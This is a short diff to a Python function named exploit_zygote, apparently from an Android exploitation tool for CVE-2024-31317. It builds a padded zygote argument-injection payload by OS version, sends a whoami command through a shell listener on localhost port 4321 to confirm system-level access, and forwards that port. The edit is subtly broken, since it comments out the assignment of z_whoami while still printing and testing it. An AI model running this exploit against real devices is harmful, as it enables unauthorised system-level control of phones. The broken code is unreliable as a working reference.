@@ -3384,7 +3384,6 @@ def exploit_zygote(zip_path, text, prog_text, change):
     if int(software.split(".")[0]) < 12:
             payload = f"LClass1;->method1(\n{zygote_arguments}"
     else:
-        print("bigger 11")
         payload = "\n" * 3000 + "A" * 5157
         payload += zygote_arguments
         payload += "," + ",\n" * 1400
@@ -3489,9 +3488,9 @@ def exploit_zygote(zip_path, text, prog_text, change):
         whoami_cmd = "busybox whoami"
     else:
         whoami_cmd = "whoami"
-    cmd = f'''sh -c \"echo 'toybox whoami' | {command} localhost 4321\"'''
-    z_whoami = device.shell(cmd)
-    #print(z_whoami)
+    cmd = f'''sh -c \"echo '{whoami_cmd}' | {command} localhost 4321\"'''
+    #z_whoami = device.shell(cmd)
+    print(z_whoami)
     if "system" in z_whoami:
         log("Device is vulnerable to CVE-2024–31317")
         device.forward("tcp:4321", "tcp:4321")
